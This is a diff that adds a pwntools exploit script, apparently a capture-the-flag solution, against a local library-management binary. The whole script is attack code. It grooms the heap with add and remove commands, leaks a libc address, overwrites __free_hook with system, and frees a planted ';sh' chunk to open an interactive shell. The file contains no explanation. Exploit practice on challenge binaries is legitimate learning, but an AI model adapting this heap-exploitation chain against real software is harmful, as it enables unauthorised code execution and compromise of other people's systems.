@@ -1,0 +1,82 @@
+from pwn import *
+from time import sleep
+
+############## setup ###############
+context.arch = "amd64"
+exe = ELF("./patched_main")
+libc = exe.libc
+host, port = "localhost", 12005 
+if args.REMOTE:
+    p = remote(host,port)
+elif args.GDB:
+    p = gdb.debug([exe.path])
+else:
+    p = process([exe.path])
+#####################################
+
+p.sendafter(b'Library>', b'add '+b'hyzr')
+p.sendafter(b'Library>', b'list')
+p.recvuntil(b'ISBN = ')
+isbn1 = p.recvline().strip().decode()
+log.info(isbn1)
+p.sendafter(b'Library>', b'add '+b'hyzr')
+p.sendafter(b'Library>', b'list')
+p.recvuntil(b'ISBN = ')
+p.recvuntil(b'ISBN = ')
+isbn6 = p.recvline().strip().decode()
+log.info(isbn6)
+p.sendafter(b'Library>', b'add '+b'A'*0x31)
+p.sendafter(b'Library>', b'list')
+p.recvuntil(b'ISBN = ')
+p.recvuntil(b'ISBN = ')
+p.recvuntil(b'ISBN = ')
+isbn2 = p.recvline().strip().decode()
+log.info(isbn2)
+p.sendafter(b'Library>', b'remove '+isbn1.encode())
+p.sendafter(b'Library>', b'remove '+isbn6.encode())
+p.sendafter(b'Library>', b'remove '+isbn2.encode())
+p.sendafter(b'Library>', b'add '+b'A'*0x7ef + p64(0x800)+p64(0))
+p.sendafter(b'Library>', b'list')
+p.recvuntil(b'ISBN = ')
+isbn3 = p.recvline().strip().decode()
+log.info(isbn3)
+p.sendafter(b'Library>', b'add '+b'A'*0x501)
+p.sendafter(b'Library>', b'remove '+isbn3.encode())
+p.sendafter(b'Library>', b'add '+b';sh\0'+b'B'*0x33)
+p.sendafter(b'Library>', b'add '+b'A'*0x74f+p16(0x760)+b'\0'*5)
+p.sendafter(b'Library>', b'add '+b'A'*0xb0)
+p.sendafter(b'Library>', b'list')
+p.recvuntil(b'0')
+p.recvuntil(b'ISBN = ')
+isbn4 = p.recvline().strip().decode()
+log.info(isbn4)
+p.recvuntil(b'2')
+p.recvuntil(b'ISBN = ')
+isbn3 = p.recvline().strip().decode()
+log.info(isbn3)
+p.sendafter(b'Library>', b'remove '+isbn3.encode())
+p.sendafter(b'Library>', b'remove '+isbn4.encode())
+p.sendafter(b'Library>', b'add '+b'Z'*0x75f)
+p.sendafter(b'Library>', b'add '+b'Z'*0x4c0)
+p.sendafter(b'Library>', b'list')
+p.recvuntil(b'TITLE = ')
+libc.address = u64(p.recvline().strip().ljust(8,b'\0')) - 0x3ebca0
+log.info(hex(libc.address)) 
+p.recvuntil(b'2')
+p.recvuntil(b'ISBN = ')
+isbn7 = p.recvline().strip().decode()
+p.recvuntil(b'3')
+p.recvuntil(b'ISBN = ')
+isbn8 = p.recvline().strip().decode()
+p.sendafter(b'Library>', b'list')
+p.recvuntil(b'1')
+p.recvuntil(b'ISBN = ')
+isbn_sh = p.recvline().strip().decode()
+p.sendafter(b'Library>', b'remove '+isbn7.encode())
+p.sendafter(b'Library>', b'remove '+isbn8.encode())
+free_hook = libc.symbols["__free_hook"]
+p.sendafter(b'Library>', b'add '+b'Z'*0x75f+p64(free_hook)+p32(0x100)+b'YEA\0')
+p.sendafter(b'Library>', b'update YEA'+b' '+p64(libc.sym.system))
+p.sendafter(b'Library>', b'remove '+isbn_sh.encode())
+
+p.interactive()
